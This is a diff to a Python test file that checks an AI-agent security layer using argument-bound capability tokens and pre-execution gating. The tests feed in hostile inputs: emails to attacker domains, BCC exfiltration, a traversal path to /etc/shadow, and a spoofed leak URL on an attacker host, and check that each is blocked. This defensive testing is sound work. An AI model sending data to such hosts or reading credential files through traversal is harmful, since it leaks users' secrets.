@@ -3,11 +3,11 @@
 Tests for Exact Argument-Bound Capabilities (P0.2) and Pre-Execution Gating (P0.3)
 Verifies:
   - Authorized email to Alice succeeds.
-  - Attempted email to attacker is BLOCKED.
+  - Attempted email to attacker (including substring recipient/domain spoofing) is BLOCKED.
   - Unauthorized BCC / CC exfiltration is BLOCKED.
   - Authorized file deletion of draft.txt succeeds.
   - Attempted deletion of all.txt or unrelated files is BLOCKED.
-  - Path traversal (../../etc/passwd) is BLOCKED.
+  - Path traversal (../../etc/shadow) is BLOCKED.
   - Tampered constraints payload is BLOCKED via HMAC signature check.
   - Side-effect spy confirms ZERO downstream tool executions when blocked.
 """
@@ -59,6 +59,25 @@ def test_unauthorized_email_recipient_blocked(kernel):
     )
     assert ok is False
     assert "recipient 'attacker@evil.org' not in authorized" in reason.lower()
+
+    # Substring recipient and domain spoofing must also fail closed
+    tok_sub = kernel.generate_capability_token("Please send email to alice and fetch https://company.com/api", session_id="s_sub")
+    ok_r, _ = kernel.verify_action_capability(
+        token=tok_sub,
+        tool_name="send_email",
+        session_id="s_sub",
+        tool_args={"recipient": "alice@evil.org"},
+        consume_nonce=False
+    )
+    assert ok_r is False
+    ok_d, _ = kernel.verify_action_capability(
+        token=tok_sub,
+        tool_name="fetch_url",
+        session_id="s_sub",
+        tool_args={"url": "https://company.com.attacker.net/leak"},
+        consume_nonce=False
+    )
+    assert ok_d is False
 
 
 def test_unauthorized_bcc_exfiltration_blocked(kernel):
@@ -171,28 +190,3 @@ def test_side_effect_spy_zero_execution(dispatcher):
     assert gate_res.executed is False
     assert execution_counter == 0  # CRITICAL INVARIANT: ZERO side effects executed!
     assert "Denial" in gate_res.execution_result or "GATED_BLOCKED" in gate_res.execution_result
-
-def test_substring_recipient_and_domain_spoofing_blocked(kernel):
-    """Verify that exact equality prevents substring recipient spoofing and dot-bounded check prevents domain spoofing."""
-    tok_r = kernel.generate_capability_token("Please send email to alice with the summary.", session_id="s_sub1")
-    ok_r, reason_r = kernel.verify_action_capability(
-        token=tok_r,
-        tool_name="send_email",
-        session_id="s_sub1",
-        tool_args={"recipient": "alice@evil.org"},
-        consume_nonce=False
-    )
-    assert ok_r is False
-    assert "not in authorized recipients" in reason_r.lower()
-
-    tok_d = kernel.generate_capability_token("Fetch status from https://company.com/status", session_id="s_sub2")
-    ok_d, reason_d = kernel.verify_action_capability(
-        token=tok_d,
-        tool_name="fetch_url",
-        session_id="s_sub2",
-        tool_args={"url": "https://company.com.attacker.net/leak"},
-        consume_nonce=False
-    )
-    assert ok_d is False
-    assert "not in authorized domains" in reason_d.lower()
-
